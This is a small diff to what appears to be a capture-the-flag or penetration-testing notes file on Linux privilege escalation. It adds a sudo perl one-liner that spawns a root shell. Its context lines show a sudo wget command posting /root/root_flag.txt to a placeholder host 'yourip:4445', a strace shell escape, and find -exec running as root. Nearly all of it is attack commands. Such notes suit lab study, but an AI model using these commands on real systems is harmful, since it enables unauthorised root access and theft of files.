@@ -24,6 +24,8 @@ sudo /usr/bin/wget --post-file=/root/root_flag.txt http://yourip:4445
 
 /usr/bin/strace -o /dev/null /bin/sh
 
+sudo perl -e 'exec "/bin/sh";'
+
 mkdir sample
 find sample -exec whoami \;
 root
